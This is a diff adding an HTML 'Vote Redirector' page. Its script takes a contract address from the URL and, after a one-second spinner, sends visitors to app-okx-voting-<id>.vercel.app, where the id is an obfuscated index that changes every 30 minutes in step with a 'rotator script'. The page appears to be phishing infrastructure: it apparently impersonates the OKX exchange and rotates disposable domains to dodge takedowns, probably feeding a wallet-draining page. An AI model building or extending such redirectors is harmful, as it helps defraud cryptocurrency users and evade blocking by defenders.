@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vote Redirector</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .container {
+            text-align: center;
+            color: white;
+            padding: 40px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        h1 {
+            margin: 0 0 10px;
+            font-size: 24px;
+            font-weight: 600;
+        }
+        p {
+            margin: 0;
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        .info {
+            margin-top: 20px;
+            font-size: 14px;
+            opacity: 1;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h1>Redirecting to vote...</h1>
+        <p id="status">Processing your vote</p>
+        <div class="info" id="info"></div>
+    </div>
+
+    <script>
+        // ============ CONFIGURATION ============
+        const START_INDEX = 69;  // Must match the rotator script
+
+        // Start time: January 6, 2026 at 00:00 UTC (hardcoded for sync)
+        const START_YEAR = 2026;
+        const START_MONTH = 0; // January (0-indexed)
+        const START_DAY = 6;
+        const START_HOUR = 0;
+        const START_MINUTE = 0;
+        // =======================================
+
+        // Obfuscation function: converts index to obfuscated string
+        function obfuscateIndex(index) {
+            const step1 = index + 47;
+            const step2 = step1 * 69;
+            const numStr = step2.toString();
+            const firstDigit = numStr[0];
+            const lastDigit = numStr[numStr.length - 1];
+            const firstLetter = String.fromCharCode(97 + parseInt(firstDigit));
+            const lastLetter = String.fromCharCode(97 + parseInt(lastDigit));
+            const middleDigits = numStr.slice(1, -1);
+            return firstLetter + middleDigits + lastLetter;
+        }
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const voteAddress = urlParams.get('vote');
+
+        if (!voteAddress) {
+            document.getElementById('status').textContent = 'Error: No vote address provided';
+            document.getElementById('info').textContent = 'Please use: ?vote=YOUR_CONTRACT_ADDRESS';
+        } else {
+            const startTime = Date.UTC(START_YEAR, START_MONTH, START_DAY, START_HOUR, START_MINUTE, 0, 0);
+            const currentTime = Date.now();
+            const elapsedTime = Math.max(0, currentTime - startTime);
+            
+            const intervalMs = 1800000; // 30 minutes in milliseconds
+            const intervalNumber = Math.floor(elapsedTime / intervalMs) + 1;
+            
+            // Calculate the actual index (START_INDEX + intervalNumber - 1)
+            const actualIndex = START_INDEX + intervalNumber - 1;
+            
+            // Apply obfuscation to the index
+            const obfuscatedId = obfuscateIndex(actualIndex);
+            
+            const redirectUrl = `https://app-okx-voting-${obfuscatedId}.vercel.app/vote/${voteAddress}`;
+            
+            // Display info for debugging
+            document.getElementById('info').innerHTML = `
+                Interval: ${intervalNumber}<br>
+                Index: ${actualIndex}<br>
+                Obfuscated: ${obfuscatedId}<br>
+                Domain: app-okx-voting-${obfuscatedId}.vercel.app
+            `;
+            
+            // Redirect after a brief delay
+            setTimeout(() => {
+                window.location.href = redirectUrl;
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
